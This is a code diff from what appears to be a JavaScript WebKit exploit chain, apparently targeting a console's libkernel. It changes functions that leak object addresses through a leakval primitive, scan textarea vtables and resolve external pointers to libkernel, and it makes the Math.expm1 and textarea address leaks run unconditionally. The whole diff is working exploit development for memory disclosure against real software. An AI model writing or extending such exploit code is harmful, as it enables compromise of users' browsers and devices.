@@ -1734,7 +1734,11 @@ function scanKnownExtPtrChunk(p, webkitBase, off, state, opts) {
         batch++;
         const fnPtr = parseAddrSync(String(raw).replace(/^0x/i, ""));
         if (!fnPtr) continue;
-        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null, opts);
+        const walkOpts = Object.assign({}, opts, {
+            maxWalkPages: opts.knownWalkPages != null ? opts.knownWalkPages
+                : (opts.lite ? 0 : (opts.maxWalkPages != null ? opts.maxWalkPages : 24)),
+        });
+        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null, walkOpts);
         if (hit) {
             saveLibkernelSession(hit.lk, hit.iatRva);
             return {
@@ -1893,17 +1897,15 @@ function discoverTextareaVtables(p, opts) {
             if (pc && pc.cell) addCell(pc.label || "pair", pc.cell);
         }
     }
-    if (!opts.lite) {
-        try {
-            const expCell = p.leakval(Math.expm1);
-            addCell("expm1.cell", expCell);
-        } catch (_) { }
-        try {
-            const ta = document.createElement("textarea");
-            if (opts.retain) opts.retain.push(ta);
-            addCell("fresh.ta", p.leakval(ta));
-        } catch (_) { }
-    }
+    try {
+        const expCell = p.leakval(Math.expm1);
+        addCell("expm1.cell", expCell);
+    } catch (_) { }
+    try {
+        const ta = document.createElement("textarea");
+        if (opts.retain) opts.retain.push(ta);
+        addCell("fresh.ta", p.leakval(ta));
+    } catch (_) { }
 
     const vtables = [];
     const seenVt = new Set();
